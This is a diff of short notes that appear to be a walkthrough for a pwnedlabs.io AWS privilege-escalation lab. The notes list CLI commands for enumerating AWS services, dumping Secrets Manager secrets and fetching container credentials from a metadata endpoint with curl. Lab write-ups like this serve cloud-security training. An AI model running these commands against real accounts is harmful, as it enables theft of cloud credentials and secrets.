@@ -9,21 +9,22 @@ https://pwnedlabs.io/labs/assume-privileged-role-with-external-id
 * Web App
 * AWS Config file (/config.json)
 * S3 credentials (AccessKeyID + secretAccessKey + Region)
-  
 ```
 aws configure
 aws-enumerator creds
 aws sts get-caller-identity
 ```
-
 * Exposed aws services (Secret manager)
 ```
 	aws-enumerator enum -services all
 	aws-enumerator dump -services <service>
 ```
 * Extract credential of user (ext/cost-optimization)
+```
 	aws secretsmanager list-secrets --query 'SecretList[*].[Name, Description, ARN]' --output json
 	aws secretsmanager get-secret-value --secret-id ext/cost-optimization
+```
+
 AWS CLI Credentials (using cloud shell)
 	TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
 	curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
